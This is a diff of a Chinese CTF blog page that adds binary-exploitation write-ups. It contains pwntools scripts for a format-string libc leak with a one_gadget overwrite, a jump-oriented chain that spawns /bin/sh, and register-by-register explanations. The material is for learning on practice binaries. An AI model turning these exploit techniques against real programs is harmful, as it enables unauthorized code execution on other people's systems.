@@ -26,10 +26,13 @@
 <meta property="og:site_name" content="Briteny&#39;s Blog">
 <meta property="og:description" content="基础ROP">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/00000000/image-20250306200030544.png">
+<meta property="og:image" content="http://example.com/00000000/image-20250307095338336.png">
 <meta property="article:published_time" content="2025-03-02T12:48:00.000Z">
-<meta property="article:modified_time" content="2025-03-04T12:51:53.061Z">
+<meta property="article:modified_time" content="2025-03-07T08:28:05.755Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/00000000/image-20250306200030544.png">
   
   
   
@@ -222,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.3k 字
+          4.8k 字
         
       </span>
     
@@ -233,7 +236,7 @@
         
         
         
-          28 分钟
+          40 分钟
         
       </span>
     
@@ -457,9 +460,33 @@
 <p>IDA_func</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">char</span> format[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+2Eh] [rbp-2h]</span><br><br>  <span class="hljs-built_in">strcpy</span>(format, <span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;give you a gift.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;show your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x60u</span>LL);<br>  <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>一些漏洞比较明显，格式化字符串漏洞，栈溢出，文章给了libc文件【还给了一个ld.so.6的文件，目前不知道有什么作用】</p>
+<p>一些漏洞比较明显，格式化字符串漏洞，栈溢出，文章给了libc文件【还给了一个ld.so.6的文件，作为动态链接器】</p>
 <p>基本思路准备是泄露libc基址按照ret2libc的基本思路写</p>
 <h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/ret2libc2$ checksec ret2libc2<br>[*] &#x27;/mnt/d/111/ret2libc2/ret2libc2&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+
+
+<p>题目给了三个附件，<strong>对于一般的C程序</strong>，<strong>修改它的配置操作如下</strong>;</p>
+<p>修改ld文件[链接器]</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --set-interpreter file_path#[链接器路径]<br></code></pre></td></tr></table></figure>
+
+<p>修改库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --replace-needed 原库名 新库名#[库路径]<br></code></pre></td></tr></table></figure>
+
+<h3 id="shift-F12"><a href="#shift-F12" class="headerlink" title="shift+F12"></a>shift+F12</h3><p><img src="/./00000000/image-20250306200030544.png" srcset="/img/loading.gif" lazyload alt="image-20250306200030544"></p>
+<p>既没有后门函数也没有现成的&#x2F;bin&#x2F;sh字符和system函数，根据题目的提示onegadget，或者自己泄露libc，我决定先试试onegadget，因为不太熟练</p>
+<p>我希望覆盖格式化字符串后可以返回printf的位置，所以ret的地址需要控制在0x401223</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000401223                 lea     rax, [rbp+format]<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br>context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]<br><br># io = process(&#x27;./ret2libc2&#x27;)<br>io = remote(&#x27;node2.anna.nssctf.cn&#x27;,28996)<br><br>def p():<br>    gdb.attach(proc.pidof(io)[0])<br><br>main = 0x401227<br>bss = 0x404000 <br><br># p()<br><br>io.recvuntil(&quot;show your magic\n&quot;)<br><br>payload = b&quot;%7$p&quot;<br>payload = payload.ljust(0x30, b&#x27;\x00&#x27;)<br>payload +=  p64(bss + 0x300) + p64(main)<br>io.send(payload)<br><br>libcbase = int(io.recv(14),16) - 0x29d90<br>success(&quot;libcbase --&gt;&quot; + hex(libcbase))<br><br>one_gadget = libcbase + 0xebc81<br><br>io.recvuntil(&quot;show your magic\n&quot;)<br>payload = b&quot;a&quot;*0x30 + p64(bss + 0x300) + p64(one_gadget)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
 
 
 
@@ -472,6 +499,166 @@
 
 
 <h2 id="真会布置栈吗？"><a href="#真会布置栈吗？" class="headerlink" title="真会布置栈吗？"></a>真会布置栈吗？</h2><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/pwn4$ checksec attachment<br>[*] &#x27;/mnt/d/111/pwn4/attachment&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<h3 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h3><p>_start:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">start</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> **v2; <span class="hljs-comment">// [rsp+0h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">void</span> *retaddr; <span class="hljs-comment">// [rsp+8h] [rbp+0h] BYREF</span><br><br>  print(a1, msg1, <span class="hljs-number">0x17Bu</span>LL);<br>  v2 = &amp;retaddr;<br>  print(a1, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v2, <span class="hljs-number">8uLL</span>);<br>  print(a1, msg2, <span class="hljs-number">0x235u</span>LL);<br>  v1 = sys_read(<span class="hljs-number">0</span>, (<span class="hljs-type">char</span> *)&amp;v2, <span class="hljs-number">0x539u</span>LL);<br>  __asm &#123; jmp     [rsp+<span class="hljs-number">8</span>+var_8] &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python3">#! /usr/bin/python3<br>from pwn import *<br>#pyright: reportUndefinedVariable=false<br><br>context.os = &#x27;linux&#x27;<br>context.arch = &#x27;amd64&#x27;<br># context.log_level = &#x27;debug&#x27;<br>context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]<br><br>elf=ELF(&quot;./attachment&quot;)<br># libc=ELF(&quot;./libc.so.6&quot;)<br><br>debug = 1<br><br>if debug:<br>    io = process(&#x27;./attachment&#x27;)<br>    #io = remote(&#x27;0.0.0.0&#x27;,9999)<br>else:<br>    io = remote(&#x27;222.67.132.186&#x27;,25608)<br><br>def p():<br>    gdb.attach(proc.pidof(io)[0])<br><br># p()<br># b *0x401079<br><br># 0x0000000000401018 : pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br># 0x0000000000401021                 xor     rdx, rdx  ; jmp     r15<br># 0x000000000040101f : jmp rdi<br># 0x0000000000401017 : pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br># 0x000000000040101a : pop r13 ; pop r15 ; jmp r15<br># 0x000000000040100C                 xchg    rax, r13<br># 0x401077   syscall ; jmp [rsp]<br># 0x000000000040101c : pop r15 ; jmp r15<br># 0x000000000040101b : pop rbp ; pop r15 ; jmp r15<br># 0x0000000000401011 :  add     rbx, 8  ; jmp qword ptr [rbx]<br># 0x401027                 xor     rsi, rsi  ; jmp     r15<br># read<br>payload=p64(0x40101a)+p64(0x401017)<br>payload+=p64(0x402800)+p64(0)+p64(0x402800)+p64(0)+p64(0x40100C)<br>payload+=p64(0x40101b)+p64(0x401077)<br>payload+=p64(0x401017)+p64(0x402800)+p64(0x402800)+p64(59)+p64(0x401011)+p64(0X40100A)<br>io.sendline(payload)<br># p()<br># sleep(0.5)<br>io.sendline(b&#x27;/bin/sh\x00&#x27;+p64(0X401021)+p64(0x401027)+p64(0x401027)+p64(0x40100C))<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>第一次送入payload的流程：</p>
+<table>
+<thead>
+<tr>
+<th align="center">high_addr</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0X40100A  [ syscall                 ; LINUX - sys_write ]</td>
+</tr>
+<tr>
+<td align="center">0x401011  [  add     rbx, 8  ; jmp qword ptr [rbx] ]</td>
+</tr>
+<tr>
+<td align="center">59</td>
+</tr>
+<tr>
+<td align="center">0x402800  [ bss段 ]</td>
+</tr>
+<tr>
+<td align="center">0x402800  [ bss段 ]</td>
+</tr>
+<tr>
+<td align="center">0x401017 [ pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15 ]</td>
+</tr>
+<tr>
+<td align="center">0x401077  [ syscall ; jmp [rsp] ]</td>
+</tr>
+<tr>
+<td align="center">0x40101b [ pop rbp ; pop r15 ; jmp r15 ]</td>
+</tr>
+<tr>
+<td align="center">0x40100C [   xchg    rax, r13 ]</td>
+</tr>
+<tr>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">0x402800 [ bss段 ]</td>
+</tr>
+<tr>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">0x402800 [ bss段 ]</td>
+</tr>
+<tr>
+<td align="center">0x401017  [ pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15 ]</td>
+</tr>
+<tr>
+<td align="center">0x40101a  [ pop r13 ; pop r15 ; jmp r15 ]</td>
+</tr>
+<tr>
+<td align="center"><strong>low_addr</strong></td>
+</tr>
+</tbody></table>
+<p><strong>payload1构造的核心思想其实就是系统调用，过程中语句繁杂，只有一部分是我们需要的，或者有一些是用来当作中间媒介的</strong></p>
+<p><strong>程序劫持后的运行流程</strong></p>
+<p>**1.**根据ida的结果可知  jmp     [rsp+8+var_8]，跳转到esp所指向的地址</p>
+<p>**2.**跳转到[esp]后执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop r13 ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 0x40101a<br>r15: 0x401017<br>rsp: stack_addr_0x402800<br></code></pre></td></tr></table></figure>
+
+<p>**3.**跳转到[r15]后执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 0 <br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x40100C<br>rsp: stack_addr_0x40101b<br></code></pre></td></tr></table></figure>
+
+<p>**4.**跳转到0x40100C后执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xchg    rax, r13<br></code></pre></td></tr></table></figure>
+
+<p>根据IDA的查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040100E                 jmp     qword ptr [rsp+0]<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: some_value<br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x40100C<br>rsp: stack_addr_0x40101b<br>rax: 0<br></code></pre></td></tr></table></figure>
+
+<p>**5.**跳转到0x40101b后执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rbp ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: some_value<br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x401077<br>rsp: stack_addr_0x401017<br>rax: 0<br>rbp: 0x40101b<br></code></pre></td></tr></table></figure>
+
+<p>**6.**跳转到0x401077后执行如下命令，触发系统调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">syscall ; jmp [rsp]<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: some_value<br>rsi: 0x402800<br>rdi: 0<br>rbx: 0x402800<br>r15: 0x401077<br>rsp: stack_addr_0x401017<br>rax: 0<br>rbp: 0x40101b<br>rdx: 0x539<br></code></pre></td></tr></table></figure>
+
+<p>rax为0，出发系统调用sys_read</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#第一个参数存储在rdi,是文件描述符fd<br>#第二个参数存储在rsi,表示缓冲区地址，也就是buf<br>#第三个参数存储在rdx,表示要读取的字节<br></code></pre></td></tr></table></figure>
+
+<p>由于程序劫持后一直没修改过rdx的值寄存器的值，所以edx的值由源_start函数中的语句决定，相关部分如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401033 &lt;+0&gt;:     movabs rsi,0x402000<br>0x000000000040103d &lt;+10&gt;:    mov    edx,0x17b<br>0x0000000000401042 &lt;+15&gt;:    call   0x401000 &lt;print&gt;<br>0x0000000000401047 &lt;+20&gt;:    push   rsp<br>0x0000000000401048 &lt;+21&gt;:    mov    rsi,rsp<br>0x000000000040104b &lt;+24&gt;:    mov    edx,0x8<br>0x0000000000401050 &lt;+29&gt;:    call   0x401000 &lt;print&gt;<br>0x0000000000401055 &lt;+34&gt;:    movabs rsi,0x40217b<br>0x000000000040105f &lt;+44&gt;:    mov    edx,0x235<br>0x0000000000401064 &lt;+49&gt;:    call   0x401000 &lt;print&gt;<br>0x0000000000401069 &lt;+54&gt;:    xor    rax,rax<br>0x000000000040106c &lt;+57&gt;:    xor    rdi,rdi<br>0x000000000040106f &lt;+60&gt;:    mov    rsi,rsp<br>0x0000000000401072 &lt;+63&gt;:    mov    edx,0x539<br>0x0000000000401077 &lt;+68&gt;:    syscall<br>0x0000000000401079 &lt;+70&gt;:    jmp    QWORD PTR [rsp]<br></code></pre></td></tr></table></figure>
+
+<p>**7.**跳转到0x401017后执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rsi ; pop rdi ; pop rbx ; pop r13 ; pop r15 ; jmp r15<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 59<br>rsi: 0x401017<br>rdi: 0x402800<br>rbx: 0x402800<br>r15: 0x401011<br>rsp: stack_addr_0x40100A<br>rax: 0<br>rbp: 0x40101b<br>rdx: 0x539<br></code></pre></td></tr></table></figure>
+
+<p>**8.**跳转到0x401011后执行如下命令，触发系统调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">syscall                 ; LINUX - sys_write<br></code></pre></td></tr></table></figure>
+
+<p>各个寄存器的值并未发生改变</p>
+<p>rax为0，触发系统调用sys_read</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#第一个参数存储在rdi,是文件描述符fd<br>#第二个参数存储在rsi,表示缓冲区地址，也就是buf<br>#第三个参数存储在rdx,表示要读取的字节<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>这个时候相当于开始向bss段写入内容，并且开始控制程序getshell，也就有了payload2的构造</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">io.sendline(b&#x27;/bin/sh\x00&#x27;+p64(0X401021)+p64(0x401027)+p64(0x401027)+p64(0x40100C))<br></code></pre></td></tr></table></figure>
+
+<p>先写入&#x2F;bin&#x2F;sh字符做准备，’\x00’用于结束读取</p>
+<p>0x401027：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rsi, rsi  ; jmp     r15<br></code></pre></td></tr></table></figure>
+
+<p>基本作用就是清空rsi，跳转到[r15]去</p>
+<p>0x401011：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add     rbx, 8  ; jmp qword ptr [rbx]<br></code></pre></td></tr></table></figure>
+
+<p>加完之后rbx的值为0x402808，这个位置存放的就是0x401021</p>
+<p>0x401021:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rdx, rdx<br>jmp     r15<br></code></pre></td></tr></table></figure>
+
+<p>清空rdx，跳转到[r15]指向的位置也就是0x401011</p>
+<p>再向后加8位，并跳转到这个位置，循环往复后跳转到0x40100C</p>
+<p>0x40100C的内容是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040100C                 xchg    rax, r13<br>.text:000000000040100E                 jmp     qword ptr [rsp+0]<br></code></pre></td></tr></table></figure>
+
+<p>最后再次跳转到[rsp]指向的地址</p>
+<p>再次触发系统调用;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">syscall<br></code></pre></td></tr></table></figure>
+
+<p>这时的寄存器的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">r13: 0<br>rsi: 0<br>rdi: 0<br>rbx: 0x402820<br>r15: 0x401011<br>rsp: stack_addr_0x40100A<br>rax: 59<br>rbp: 0x40101b<br>rdx: 0<br></code></pre></td></tr></table></figure>
+
+<p>这时的rax的值为59，系统调用为execve()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#第一个参数为程序路径，指向可执行文件,存储在rdi中<br>#第二个参数为参数数组，指向程序的参数列表，存储在rsi中<br>#第三个参数为环境变量参数，指向程序的环境变量列表，存储在rdx中<br></code></pre></td></tr></table></figure>
+
+<p>这时设置的参数数组只有一个元素，设置为0，环境变量数组设置为0，最后成功getshell</p>
+<h2 id="my-vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h2><h3 id="题目附件送的gift图片"><a href="#题目附件送的gift图片" class="headerlink" title="题目附件送的gift图片"></a>题目附件送的gift图片</h3><p><img src="/./00000000/image-20250307095338336.png" srcset="/img/loading.gif" lazyload alt="image-20250307095338336"></p>
+<h3 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/vm$ checksec my_vm<br>[*] &#x27;/mnt/d/111/vm/my_vm&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+
 
 
                 
